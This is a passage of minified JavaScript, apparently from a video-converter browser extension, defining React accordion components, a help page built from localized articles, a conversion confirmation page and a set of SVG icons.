                props.headerColor};padding:4px 8px;&:not(:first-of-type){margin-top:8px}& svg{fill:${(props) => props.headerColor}}`,
            item_TitleContainer = styled_components_browser_esm.a.div.withConfig({
                displayName: "item__TitleContainer",
                componentId: "sc-40hkay-2",
            })`display:flex;flex-direction:row;align-items:center;max-width:calc(100% - 30px);& + svg{transition:transform 0.3s ease-in-out}`,
            item_Title = styled_components_browser_esm.a.span.withConfig({ displayName: "item__Title", componentId: "sc-40hkay-3" })`font-size:14px;margin:0 8px;`,
            ContentMask = styled_components_browser_esm.a.div.withConfig({ displayName: "item__ContentMask", componentId: "sc-40hkay-4" })`overflow:hidden;transition:height 0.3s ease-in-out;`,
            item_Content = styled_components_browser_esm.a.div.withConfig({ displayName: "item__Content", componentId: "sc-40hkay-5" })`display:inline-block;background-color:${(props) => props.contentBackground};color:${(props) =>
                props.contentColor};font-size:14px;padding:8px;box-sizing:border-box;width:100%;& span{& a{color:${(props) => props.contentColor}}& b{font-weight:bold}}`;
        var accordion_item = ({ type: type, id: id, name: name, checked: checked, onCheck: onCheck, onChange: onChange, header: header, content: content }) => {
            const { dir: dir, theme: theme } = use_app_state(["dir", "theme"]),
                [contentNode, setContentNode] = Object(react.useState)(null),
                [contentHeight, setContentHeight] = Object(react.useState)(null),
                isCheckbox = "checkbox" === type,
                [isChecked, setIsChecked] = Object(react.useState)(checked),
                defaultChecked = isCheckbox ? isChecked : checked,
                accordionStyles = theme && theme.accordion,
                headerStyles = accordionStyles && accordionStyles.header,
                headerBackground = headerStyles && headerStyles.background,
                headerColor = headerStyles && headerStyles.color,
                contentStyles = accordionStyles && accordionStyles.content,
                contentBackground = contentStyles && contentStyles.background,
                contentColor = contentStyles && contentStyles.color,
                contentHyperlink = contentStyles && contentStyles.hyperlink,
                contentHyperlinkColor = contentHyperlink && contentHyperlink.color,
                contentHyperlinkHover = contentHyperlink && contentHyperlink.hover;
            return react_default.a.createElement(
                react_default.a.Fragment,
                null,
                react_default.a.createElement(item_Input, {
                    type: isCheckbox ? "checkbox" : "radio",
                    id: id,
                    name: name,
                    defaultChecked: defaultChecked,
                    contentHeight: contentHeight,
                    iconTransform: `rotate(${"rtl" === dir ? -90 : 90}deg)`,
                    onChange: () => onChange(defaultChecked),
                }),
                react_default.a.createElement(
                    item_Label,
                    { htmlFor: id, headerBackground: headerBackground, headerColor: headerColor, onClick: () => (isCheckbox ? setIsChecked(!isChecked) : onCheck()) },
                    react_default.a.createElement(item_TitleContainer, null, react_default.a.createElement(enquiry, { style: { minWidth: 23 } }), react_default.a.createElement(item_Title, null, header)),
                    react_default.a.createElement(angle_down, null)
                ),
                react_default.a.createElement(
                    ContentMask,
                    {
                        onTransitionEnd: () => {
                            if (defaultChecked && null !== contentNode) {
                                const containerNode = contentNode.parentNode.parentNode,
                                    boundingClientRect = containerNode.getBoundingClientRect(),
                                    containerHeight = boundingClientRect && boundingClientRect.height;
                                if (containerHeight && contentHeight) {
                                    const titleOffsetTop = contentNode.parentNode.previousSibling.offsetTop,
                                        containerOffsetTop = containerNode.offsetTop,
                                        contentOffsetTop = contentNode.offsetTop,
                                        { scrollTop: scrollTop } = containerNode,
                                        scrollTopMin = contentOffsetTop - containerOffsetTop + contentHeight - containerHeight,
                                        scrollTopMax = titleOffsetTop - containerOffsetTop;
                                    scrollTop < scrollTopMin ? scroll_to(containerNode, scrollTopMin, 200) : scrollTop > scrollTopMax && scroll_to(containerNode, scrollTopMax, 200);
                                }
                            }
                        },
                    },
                    react_default.a.createElement(
                        item_Content,
                        {
                            ref: (node) => {
                                if ((setContentNode(node), null !== node)) {
                                    const boundingClientRect = node.getBoundingClientRect(),
                                        height = boundingClientRect && boundingClientRect.height;
                                    height && setContentHeight(height);
                                }
                            },
                            contentBackground: contentBackground,
                            contentColor: contentColor,
                            contentHyperlinkColor: contentHyperlinkColor,
                            contentHyperlinkHover: contentHyperlinkHover,
                        },
                        content
                    )
                )
            );
        };
        const accordionNamePrefix = random_name_generator(12);
        var accordion = ({ type: type, name: name, data: data, scrollTop: scrollTop, onScroll: onScroll, onChange: onChange }) => {
            const [checkedItem, setCheckedItem] = Object(react.useState)(data && data.map((e) => e.checked).indexOf(!0)),
                itemName = `${accordionNamePrefix}-accordion-${name}`,
                { module: module, bodyScrollbarWidth: bodyScrollbarWidth } = use_app_state(["module", "bodyScrollbarWidth"]),
                { getScrollContainer: getScrollContainer } = module,
                moduleScrollContainer = getScrollContainer && getScrollContainer();
            return react_default.a.createElement(
                scroll_container,
                { scrollTop: scrollTop, onScroll: onScroll, paddingHorizontal: 16, maxHeight: moduleScrollContainer || bodyScrollbarWidth ? 364 : null, scrollPaddingBottom: 8 },
                data &&
                    data.map((item, i) =>
                        react_default.a.createElement(accordion_item, {
                            key: item.header,
                            type: type,
                            id: `${itemName}-${i}`,
                            name: itemName,
                            checked: "checkbox" === type ? item.checked : i === checkedItem,
                            onCheck: () => {
                                setCheckedItem(i === checkedItem ? -1 : i);
                            },
                            onChange: (checked) => {
                                onChange && onChange(i, checked);
                            },
                            header: item.header,
                            content: item.content,
                        })
                    )
            );
        };
        var camera = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "22px", height: "18px", viewBox: "0 0 22 18", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M 22 4.9 Q 22 3.8 21.2 3.05 20.4 2.25 19.3 2.25 L 16.4 2.25 16 1.3 Q 15.65 0.5 14.9 0.2 14.55 0.05 14.25 0 L 7.75 0 Q 7.45 0.05 7.1 0.2 6.35 0.5 6 1.3 L 5.6 2.25 2.7 2.25 Q 1.6 2.25 0.85 3.05 0.05 3.8 0 4.9 L 0 15.3 Q 0.05 16.4 0.85 17.15 1.6 17.95 2.7 18 L 19.3 18 Q 20.4 17.95 21.2 17.15 22 16.4 22 15.3 L 22 4.9 M 11 4.9 Q 13.15 4.9 14.7 6.4 16.2 7.95 16.2 10.1 16.2 12.3 14.7 13.8 13.15 15.3 11 15.3 8.85 15.3 7.35 13.8 5.8 12.3 5.8 10.1 5.8 7.95 7.35 6.4 8.85 4.9 11 4.9 M 13.4 7.75 Q 12.4 6.75 11 6.75 9.6 6.75 8.6 7.75 7.65 8.7 7.65 10.1 7.65 11.5 8.6 12.5 9.6 13.5 11 13.5 12.4 13.5 13.4 12.5 14.35 11.5 14.35 10.1 14.35 8.7 13.4 7.75 Z",
                })
            );
        const ButtonContainer = styled_components_browser_esm.a.div.withConfig({ displayName: "help__ButtonContainer", componentId: "sc-cprc2y-0" })`margin:22px 0 0;`,
            help_Button = styled_components_browser_esm.a.button.withConfig({
                displayName: "help__Button",
                componentId: "sc-cprc2y-1",
            })`outline:none;border:none;margin:0 auto 11px;display:flex;align-items:center;cursor:pointer;background-color:transparent;& svg path{fill:${(props) => props.buttonColor};}& span{color:${(props) =>
                props.buttonColor};}&:hover{& svg path{fill:${(props) => props.buttonHoverColor};}& span{color:${(props) => props.buttonHoverColor};}}`,
            help_Text = styled_components_browser_esm.a.span.withConfig({
                displayName: "help__Text",
                componentId: "sc-cprc2y-2",
            })`font-family:Arial,Helvetica,sans-serif;font-size:14px;&::before{content:" ";display:inline-block;width:7px;}`,
            StSpan = styled_components_browser_esm.a.span.withConfig({ displayName: "help__StSpan", componentId: "sc-cprc2y-3" })`font-size:14px;line-height:20px;vertical-align:middle;& a{cursor:pointer;text-decoration:underline;color:${(
                props
            ) => props.contentHyperlinkColor};&:hover{color:${(props) => props.contentHyperlinkHover}}}& li::before{content:"\u25CF";margin:0 6px;}`,
            Span = ({ html: html }) => react_default.a.createElement(StSpan, { dangerouslySetInnerHTML: { __html: html } }),
            ImgInline = (img, key, isNbspBefore) => {
                const { theme: theme } = use_app_state(["theme"]),
                    accordionStyles = theme && theme.accordion,
                    contentStyles = accordionStyles && accordionStyles.content,
                    style = { fill: contentStyles && contentStyles.color, verticalAlign: "middle" };
                return isNbspBefore ? react_default.a.createElement("nobr", { key: key }, " ", react_default.a.createElement(img, { style: style })) : react_default.a.createElement(img, { key: key, style: style });
            },
            Article = ({ content: content }) => {
                const { extensionName: extensionName, desktopClientUrl: desktopClientUrl, desktopClientName: desktopClientName, onlineVideoPlatform: onlineVideoPlatform } = config.a;
                let endsWithNbsp = !1;
                return content
                    .replace(/{%onlineVideoPlatform%}/g, onlineVideoPlatform)
                    .replace(/{%extensionName%}/g, extensionName)
                    .replace(/{%desktopClientUrl%}/g, desktopClientUrl)
                    .replace(/{%desktopClientName%}/g, desktopClientName)
                    .split('<a href="')
                    .reduce((result, item, i) => {
                        let res = result;
                        return (
                            item.startsWith("undefined")
                                ? (res += item
                                      .substring(item.indexOf(">") + 1, item.length)
                                      .split("</a>")
                                      .join(""))
                                : (i > 0 && (res += '<a href="'), (res += item)),
                            res
                        );
                    }, "")
                    .split("\x3c!--[")
                    .reduce((result, item) => {
                        item.startsWith("img-camera")
                            ? result.push(ImgInline(camera, result, endsWithNbsp))
                            : item.startsWith("img-copy")
                            ? result.push(ImgInline(icons_copy, result, endsWithNbsp))
                            : item.startsWith("img-qr-code")
                            ? result.push(ImgInline(qr_code, result, endsWithNbsp))
                            : item.startsWith("img-fps-60")
                            ? result.push(ImgInline(fps_60, result, endsWithNbsp))
                            : item.startsWith("img-sound-on") && result.push(ImgInline(sound_on, result, endsWithNbsp));
                        const index = item.indexOf("]--\x3e");
                        let str = -1 === index ? item : item.substring(index + 4);
                        const nbspPos = str.length - 6;
                        return (endsWithNbsp = -1 !== str.indexOf("&nbsp;", nbspPos)), endsWithNbsp && (str = str.substring(0, nbspPos)), "" !== str && result.push(react_default.a.createElement(Span, { key: result, html: str })), result;
                    }, []);
            };
        var pages_help = () => {
            const { serviceName: serviceName, theme: theme, helpState: helpState, setHelpState: setHelpState, getContactUsUrl: getContactUsUrl } = use_app_state(["serviceName", "theme", "helpState", "setHelpState", "getContactUsUrl"]),
                history = useHistory(),
                { t: t, i18n: i18n } = useTranslation(),
                articles = i18n.t("help_articles", { returnObjects: !0 }),
                { language: language } = i18n,
                landingUrl = getContactUsUrl(language),
                buttonStyles = theme && theme.icon_button,
                buttonColor = buttonStyles && buttonStyles.color,
                buttonHoverColor = buttonStyles && buttonStyles.hover;
            use_event_listener(window, "click", (e) => {
                "a" === e.target.localName && "settings" === e.target.getAttribute("data-webext-page") && (e.preventDefault(), e.stopPropagation(), history.push("/settings"));
            });
            const getScrollTop = () => (helpState && helpState.scrollTop) || 0,
                getItemChecked = () => helpState && helpState.itemChecked;
            let i = 0;
            const helpArticles = articles.reduce((result, item) => {
                    const { services: services } = item;
                    if (!services || services.includes(serviceName)) {
                        const itemChecked = getItemChecked();
                        result.push({ checked: !!itemChecked && itemChecked[i], header: item.title, content: react_default.a.createElement(Article, { content: item.article }) }), i++;
                    }
                    return result;
                }, []),
                itemChecked = getItemChecked() || new Array(i).fill(!1);
            return react_default.a.createElement(
                page,
                { title: t("help") },
                react_default.a.createElement(accordion, {
                    type: "checkbox",
                    name: "help",
                    data: helpArticles,
                    scrollTop: getScrollTop(),
                    onScroll: (scrollTop) => {
                        setHelpState({ scrollTop: scrollTop, itemChecked: itemChecked });
                    },
                    onChange: (item, checked) => {
                        const scrollTop = getScrollTop();
                        (itemChecked[item] = checked), setHelpState({ scrollTop: scrollTop, itemChecked: itemChecked });
                    },
                }),
                react_default.a.createElement(
                    ButtonContainer,
                    null,
                    landingUrl &&
                        react_default.a.createElement(
                            help_Button,
                            {
                                buttonColor: buttonColor,
                                buttonHoverColor: buttonHoverColor,
                                onClick: () => {
                                    window.open(landingUrl, "_blank");
                                },
                            },
                            react_default.a.createElement(feedback, null),
                            react_default.a.createElement(help_Text, null, t("drop_us_a_line"))
                        )
                )
            );
        };
        var arrow_fat_down = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "14px", height: "16px", viewBox: "0 0 14 16", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d: "M14,8.9c-0.1-0.1-0.2-0.2-0.3-0.2H10V0.3C10,0.1,9.8,0,9.7,0H4.3C4.1,0,4, 0.1,4,0.3v8.3H0.3C0.2,8.7,0.1,8.7,0,8.9C0,9,0,9.1,0.1,9.2l6.6,6.7C6.8, 16,6.9,16,7,16s0.2,0,0.2-0.1l6.7-6.7C14,9.1,14,9,14,8.9z",
                })
            );
        const confirm_Container = styled_components_browser_esm.a.div.withConfig({ displayName: "confirm__Container", componentId: "sc-1wnoywa-0" })`display:flex;flex-direction:row;justify-content:space-between;margin:6px 10px;color:${(
                props
            ) => props.color};& .iconCpuActivity{display:block;fill:${(props) => props.color};width:56px;height:56px;margin:0 6px;}`,
            Conlumn = styled_components_browser_esm.a.div.withConfig({ displayName: "confirm__Conlumn", componentId: "sc-1wnoywa-1" })`display:flex;flex-direction:column;align-items:flex-end;margin:0 6px;`,
            Paragraph = styled_components_browser_esm.a.p.withConfig({ displayName: "confirm__Paragraph", componentId: "sc-1wnoywa-2" })`font-size:14px;width:350px;margin-bottom:16px;`,
            Form = styled_components_browser_esm.a.form.withConfig({ displayName: "confirm__Form", componentId: "sc-1wnoywa-3" })`margin-bottom:11px;& button{margin-bottom:12px;&:not(:first-of-type){${(props) =>
                "rtl" === props.dir ? "margin-right: 8px;" : "margin-left: 8px;"}}}`;
        var pages_confirm = () => {
            const { dir: dir, theme: theme, download: download, warnBeforeConverting: warnBeforeConverting, setWarnBeforeConverting: setWarnBeforeConverting } = use_app_state([
                    "dir",
                    "theme",
                    "download",
                    "warnBeforeConverting",
                    "setWarnBeforeConverting",
                ]),
                history = useHistory(),
                { t: t } = useTranslation(),
                globals = theme && theme.globals,
                color = globals && globals.color;
            return react_default.a.createElement(
                page,
                { title: t("confirm_conversion_title") },
                react_default.a.createElement(
                    confirm_Container,
                    { color: color },
                    react_default.a.createElement(cpu_activity, { className: "iconCpuActivity" }),
                    react_default.a.createElement(
                        Conlumn,
                        null,
                        react_default.a.createElement(Paragraph, null, t("confirm_conversion_message")),
                        react_default.a.createElement(
                            Form,
                            {
                                dir: dir,
                                onSubmit: (evt) => {
                                    evt.preventDefault(), download();
                                },
                            },
                            react_default.a.createElement(ui_button, {
                                onClick: (evt) => {
                                    evt.preventDefault(), history.go(-1);
                                },
                                text: t("cancel"),
                                styleName: "glowBorder",
                            }),
                            react_default.a.createElement(ui_button, { type: "submit", icon: arrow_fat_down, text: t("continue"), disabled: !download, styleName: "glowBorder" }),
                            react_default.a.createElement(ui_checkbox, { id: "doNotShowOnLoad", label: t("do_not_show_on_load"), checked: !warnBeforeConverting, onChange: () => setWarnBeforeConverting(!warnBeforeConverting) })
                        )
                    )
                )
            );
        };
        var share = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "19px", height: "20.8px", viewBox: "0 0 19 20.8", style: style, className: className },
                react_default.a.createElement("path", { fill: color, d: "M18.4,3.6c0,1.6-1.3,2.8-2.8,2.8s-2.9-1.3-2.9-2.8c0-1.6,1.3-2.8,2.8-2.8S18.4,2,18.4,3.6z" }),
                react_default.a.createElement("path", {
                    fill: color,
                    d: "M15.5,7C13.6,7,12,5.5,12,3.5C12,1.6,13.5,0,15.5,0S19,1.6,19,3.6C19,5.5,17.5,7,15.5,7z M15.5,1.4c-1.2,0-2.2,1-2.2,2.2s1,2.2,2.2,2.2s2.2-1,2.2-2.2S16.7,1.4,15.5,1.4z",
                }),
                react_default.a.createElement("path", { fill: color, d: "M18.4,17.4c0,1.6-1.3,2.8-2.8,2.8s-2.8-1.3-2.8-2.8c0-1.6,1.3-2.8,2.8-2.8S18.4,15.8,18.4,17.4z" }),
                react_default.a.createElement("path", {
                    fill: color,
                    d: "M15.5,20.8c-1.9,0-3.5-1.5-3.5-3.5c0-1.9,1.5-3.5,3.5-3.5s3.5,1.5,3.5,3.5S17.5,20.8,15.5,20.8z M15.5,15.2c-1.2,0-2.2,1-2.2,2.2s1,2.2,2.2,2.2s2.2-1,2.2-2.2S16.7,15.2,15.5,15.2z",
                }),
                react_default.a.createElement("path", { fill: color, d: "M6.3,10.5c0,1.6-1.3,2.8-2.8,2.8c-1.6,0-2.8-1.3-2.8-2.8S2,7.7,3.5,7.7C5,7.7,6.3,8.9,6.3,10.5z" }),
                react_default.a.createElement("path", {
                    fill: color,
                    d: "M3.5,13.9c-1.9,0-3.5-1.5-3.5-3.5s1.5-3.5,3.5-3.5C5.4,6.9,7,8.4,7,10.4S5.4,13.9,3.5,13.9z M3.5,8.3c-1.2,0-2.2,1-2.2,2.2c0,1.2,1,2.2,2.2,2.2s2.2-1,2.2-2.2C5.7,9.3,4.6,8.3,3.5,8.3z",
                }),
                react_default.a.createElement("path", { fill: color, d: "M5.5,10c-0.3,0-0.6-0.2-0.8-0.4c-0.2-0.4,0-0.9,0.4-1.2l8-4.6c0.4-0.2,0.9-0.1,1.2,0.3 C14.5,4.5,14.4,5,14,5.3L6,9.9C5.8,10,5.6,10,5.5,10z" }),
                react_default.a.createElement("path", { fill: color, d: "M13.5,17.2c-0.1,0-0.3,0-0.4-0.1l-8-4.6c-0.4-0.2-0.6-0.8-0.3-1.2C5,10.9,5.6,10.7,6,11l8, 4.6c0.4,0.2,0.6,0.8,0.3,1.2C14.1,17,13.8,17.2,13.5,17.2z" })
            );
        var over_ru = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "51.25px", height: "13px", viewBox: "0 0 51.25 13", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        " M 7.1 4.25 Q 6.8 4.1 6.45 4.1 L 1.7 4.1 1.7 2.55 7.1 1.7 7.1 0 1.85 0.85 Q 1.35 0.95 1 1.1 0.7 1.2 0.5 1.45 0.25 1.7 0.1 2 0 2.3 0 2.75 L 0 11.3 Q 0 11.65 0.1 11.95 0.25 12.25 0.5 12.5 0.7 12.75 1 12.85 1.35 13 1.7 13 L 6.45 13 Q 6.8 13 7.1 12.85 7.45 12.75 7.65 12.5 7.9 12.25 8.05 11.95 8.15 11.65 8.15 11.3 L 8.15 5.8 Q 8.15 5.45 8.05 5.15 7.9 4.85 7.65 4.6 7.45 4.35 7.1 4.25 M 6.45 5.8 L 6.45 11.3 1.7 11.3 1.7 5.8 6.45 5.8 M 18.85 4.8 Q 18.7 4.45 18.5 4.25 18.25 4 17.95 3.9 17.65 3.75 17.3 3.75 L 12.7 3.75 Q 12.35 3.75 12 3.9 11.7 4 11.5 4.25 11.25 4.45 11.1 4.8 11 5.1 11 5.45 L 11 11.3 Q 11 11.65 11.1 11.95 11.25 12.25 11.5 12.5 11.7 12.75 12 12.85 12.35 13 12.7 13 L 17.3 13 Q 17.65 13 17.95 12.85 18.25 12.75 18.5 12.5 18.7 12.25 18.85 11.95 19 11.65 19 11.3 L 19 5.45 Q 19 5.1 18.85 4.8 M 12.7 11.3 L 12.7 5.45 17.3 5.45 17.3 11.3 12.7 11.3 M 24.35 3.75 Q 23.95 3.75 23.65 3.9 23.35 4 23.1 4.25 22.9 4.45 22.75 4.8 22.6 5.1 22.6 5.45 L 22.6 11.3 21.3 11.3 21.3 13 22.6 13 Q 22.95 13 23.3 12.85 23.6 12.75 23.85 12.5 24.05 12.25 24.2 11.95 24.35 11.65 24.35 11.3 L 24.35 5.45 28.25 5.45 28.25 13 29.95 13 29.95 3.75 24.35 3.75 M 40.6 5.45 Q 40.6 5.1 40.5 4.8 40.35 4.45 40.1 4.25 39.9 4 39.55 3.9 39.25 3.75 38.9 3.75 L 34.5 3.75 Q 34.15 3.75 33.8 3.9 33.5 4 33.3 4.25 33.05 4.45 32.9 4.8 32.8 5.1 32.8 5.45 L 32.8 11.3 Q 32.8 11.65 32.9 11.95 33.05 12.25 33.3 12.5 33.5 12.75 33.8 12.85 34.15 13 34.5 13 L 40.6 13 40.6 11.3 34.5 11.3 34.5 9.25 40.6 9.25 40.6 5.45 M 38.9 7.55 L 34.5 7.55 34.5 5.45 38.9 5.45 38.9 7.55 M 51.15 4.8 Q 51 4.45 50.75 4.25 50.55 4 50.2 3.9 49.9 3.75 49.55 3.75 L 45.15 3.75 Q 44.8 3.75 44.45 3.9 44.15 4 43.95 4.25 43.7 4.45 43.55 4.8 43.45 5.1 43.45 5.45 L 43.45 11.3 Q 43.45 11.65 43.55 11.95 43.7 12.25 43.95 12.5 44.15 12.75 44.45 12.85 44.8 13 45.15 13 L 51.25 13 51.25 11.3 45.15 11.3 45.15 9.25 51.25 9.25 51.25 5.45 Q 51.25 5.1 51.15 4.8 M 45.15 7.55 L 45.15 5.45 49.55 5.45 49.55 7.55 45.15 7.55 Z",
                })
            );
        var over_en = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "38.25px", height: "9.25px", viewBox: "0 0 38.25 9.25", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        " M 6.95 0.15 Q 6.65 0 6.3 0 L 1.7 0 Q 1.35 0 1 0.15 0.7 0.25 0.5 0.5 0.25 0.7 0.1 1.05 0 1.35 0 1.7 L 0 7.55 Q 0 7.9 0.1 8.2 0.25 8.5 0.5 8.75 0.7 9 1 9.1 1.35 9.25 1.7 9.25 L 6.3 9.25 Q 6.65 9.25 6.95 9.1 7.25 9 7.5 8.75 7.7 8.5 7.85 8.2 8 7.9 8 7.55 L 8 1.7 Q 8 1.35 7.85 1.05 7.7 0.7 7.5 0.5 7.25 0.25 6.95 0.15 M 1.7 7.55 L 1.7 1.7 6.3 1.7 6.3 7.55 1.7 7.55 M 14.3 7.2 L 11.5 0 9.7 0 13.4 9.25 15.2 9.25 18.9 0 17.1 0 14.3 7.2 M 28.4 1.05 Q 28.25 0.7 28 0.5 27.8 0.25 27.45 0.15 27.15 0 26.8 0 L 22.4 0 Q 22.05 0 21.7 0.15 21.4 0.25 21.2 0.5 20.95 0.7 20.8 1.05 20.7 1.35 20.7 1.7 L 20.7 7.55 Q 20.7 7.9 20.8 8.2 20.95 8.5 21.2 8.75 21.4 9 21.7 9.1 22.05 9.25 22.4 9.25 L 28.5 9.25 28.5 7.55 22.4 7.55 22.4 5.5 28.5 5.5 28.5 1.7 Q 28.5 1.35 28.4 1.05 M 26.8 1.7 L 26.8 3.8 22.4 3.8 22.4 1.7 26.8 1.7 M 38.25 1.7 Q 38.25 1.35 38.15 1.05 38 0.7 37.75 0.5 37.55 0.25 37.25 0.15 36.9 0 36.55 0 L 34.75 0 Q 34.4 0 34.1 0.1 33.8 0.25 33.55 0.45 33.3 0.7 33.2 1 33.059375 1.28125 33.05 1.55 L 33.05 0 31.35 0 31.35 9.25 33.05 9.25 33.05 1.7 36.55 1.7 36.55 3.25 38.25 3.25 38.25 1.7 Z",
                })
            );
        var num_0 = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "25.9px", height: "33px", viewBox: "0 0 25.9 33", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        " M 23.05 0.4 Q 22.15 0 21.2 0 L 4.7 0 Q 3.75 0 2.9 0.4 2 0.8 1.35 1.4 0.7 2.05 0.35 2.9 0 3.75 0 4.75 L 0 28.3 Q 0 29.25 0.35 30.15 0.45 30.4 0.6 30.6 0.9 31.15 1.35 31.6 2 32.25 2.9 32.65 3.75 33 4.7 33 L 21.2 33 Q 22.15 33 23.05 32.65 23.9 32.25 24.5 31.6 24.95 31.15 25.3 30.6 25.45 30.4 25.55 30.15 25.9 29.25 25.9 28.3 L 25.9 4.75 Q 25.9 3.75 25.55 2.9 25.15 2.05 24.5 1.4 23.9 0.8 23.05 0.4 M 4.7 4.75 L 21.2 4.75 21.2 28.3 4.7 28.3 4.7 4.75 Z",
                })
            );
        var num_1 = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "10.4px", height: "33px", viewBox: "0 0 10.4 33", style: style, className: className },
                react_default.a.createElement("path", { fill: color, d: " M 10.4 0 L 0 0 0 4.75 5.65 4.75 5.65 33 10.4 33 10.4 0 Z" })
            );
        var num_2 = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "24.95px", height: "33px", viewBox: "0 0 24.95 33", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        " M 23 1.4 Q 22.35 0.8 21.5 0.4 20.65 0 19.65 0 L 4.75 0 Q 3.75 0 2.9 0.4 2.05 0.8 1.4 1.4 0.75 2.05 0.4 2.9 0 3.75 0 4.75 L 0 9 4.75 9 4.75 4.75 19.65 4.75 19.65 11.55 3.3 19.25 Q 2.45 19.65 1.85 20.15 1.2 20.65 0.8 21.25 0.4 21.85 0.25 22.6 0 23.35 0 24.35 L 0 33 24.95 33 24.95 24.05 20.25 24.05 20.25 28.3 4.75 28.3 4.75 23.5 21.05 15.85 Q 21.95 15.45 22.6 14.95 23.2 14.45 23.6 13.85 24 13.25 24.2 12.5 24.4 11.75 24.4 10.75 L 24.4 4.75 Q 24.4 3.75 24 2.9 23.6 2.05 23 1.4 Z",
                })
            );
        var num_3 = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "25.8px", height: "33px", viewBox: "0 0 25.8 33", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        " M 20.75 8.3 L 20.75 10.45 Q 20.75 12.25 20 13.1 19.25 13.95 17.5 14.05 L 7.9 14.05 7.9 18.65 17.65 18.65 Q 19.55 18.65 20.35 19.5 21.2 20.35 21.2 22.2 L 21.2 24.75 Q 21.2 26.65 20.35 27.5 19.55 28.4 17.65 28.4 L 8.15 28.4 Q 6.25 28.4 5.45 27.5 4.6 26.65 4.6 24.75 L 4.6 23 0 23 0 25 Q 0 33 8 33 L 17.8 33 Q 25.8 33 25.8 25 L 25.8 23.35 Q 25.8 20.25 24.7 18.4 23.6 16.55 21.5 15.9 23.4 15.05 24.35 13.25 25.35 11.45 25.35 8.65 L 25.35 8.05 Q 25.35 4 23.4 2 21.4 0 17.35 0 L 8.5 0 Q 0.5 0 0.5 8.05 L 0.5 10 5.1 10 5.1 8.3 Q 5.1 6.4 5.95 5.5 6.75 4.65 8.6 4.65 L 17.2 4.65 Q 19.05 4.65 19.9 5.5 20.75 6.4 20.75 8.3 Z",
                })
            );
        var num_4 = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "26.25px", height: "33px", viewBox: "0 0 26.25 33", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d: " M 21.8 21.65 L 21.8 0 16.25 0 0 21.65 0 26.15 17.1 26.15 17.1 33 21.8 33 21.8 26.15 26.25 26.15 26.25 21.65 21.8 21.65 M 17.1 5.7 L 17.1 21.65 5.1 21.65 17.1 5.7 Z",
                })
            );
        var num_5 = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "24.9px", height: "33px", viewBox: "0 0 24.9 33", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        " M 24.05 4.75 L 24.05 0 0.95 0 0.95 16.75 16.7 16.75 Q 18.6 16.75 19.45 17.6 20.25 18.45 20.25 20.35 L 20.25 24.75 Q 20.25 26.65 19.45 27.5 18.6 28.4 16.7 28.4 L 8.15 28.4 Q 6.25 28.4 5.45 27.5 4.6 26.65 4.6 24.75 L 4.6 23 0 23 0 25 Q 0 33 8 33 L 16.9 33 Q 20.9 33 22.85 31 24.8 29 24.9 25 L 24.9 20.15 Q 24.9 16.05 22.9 14.1 20.9 12.15 16.9 12.15 L 5.65 12.15 5.65 4.75 24.05 4.75 Z",
                })
            );
        var num_6 = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "24.45px", height: "33px", viewBox: "0 0 24.45 33", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        " M 24.45 9 L 24.45 4.75 Q 24.45 3.75 24.1 2.9 23.75 2.05 23.1 1.4 22.45 0.8 21.6 0.4 20.75 0 19.75 0 L 4.7 0 Q 3.75 0 2.9 0.4 2 0.8 1.35 1.4 0.7 2.05 0.35 2.9 0 3.75 0 4.75 L 0 28.3 Q 0 29.25 0.35 30.15 0.7 31 1.35 31.6 2 32.25 2.9 32.65 3.75 33 4.7 33 L 19.75 33 Q 20.75 33 21.6 32.65 22.45 32.25 23.1 31.6 23.75 31 24.1 30.15 24.45 29.25 24.45 28.3 L 24.45 18.9 Q 24.45 17.9 24.1 17.05 23.75 16.2 23.1 15.55 22.45 14.9 21.6 14.55 20.75 14.15 19.75 14.15 L 4.7 14.15 4.7 4.75 19.75 4.75 19.75 9 24.45 9 M 4.7 18.9 L 19.75 18.9 19.75 28.3 4.7 28.3 4.7 18.9 Z",
                })
            );
        var num_7 = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "25.4px", height: "33px", viewBox: "0 0 25.4 33", style: style, className: className },
                react_default.a.createElement("path", { fill: color, d: " M 9.05 33 L 25.4 1.45 25.4 0 0 0 0 4.75 18.4 4.75 3.6 33 9.05 33 Z" })
            );
        var num_8 = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
